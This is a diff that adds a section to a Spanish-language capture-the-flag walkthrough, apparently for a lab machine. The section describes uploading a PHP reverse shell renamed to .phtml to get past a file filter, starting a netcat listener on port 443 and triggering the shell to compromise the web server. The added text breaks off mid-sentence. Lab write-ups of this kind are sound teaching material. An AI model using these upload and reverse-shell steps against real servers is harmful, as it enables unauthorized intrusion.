@@ -133,6 +133,29 @@ Podemos ver que hay un subdirectorio llamado /uploads y se ve así:
 
 ![7](/assets/img/sample/7.png)
 
+Ahora procedemos a subir nuestra shell
+
+## Comprometiendo el servidor web
+
+usamos el comando ```cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml``` para mover nuestra shell y poner la extensión .phtml (OJO: hay que editar la shell y cambiar la ip y el puerto!)
+
+luego la subimos en /internal
+
+ponemos a la escucha netcat con el comando ```nc -lnvp TUPUERTO``` en mi caso era el 443 así que era ```nc -lnvp 443```
+
+lo ejecutamos en /uploads
+
+si todo salió bien, debería aparece algo así en la terminal:
+
+![8](/assets/img/sample/8.png)
+
+
+
+
+
+ponemos a
+
+
 
 
 
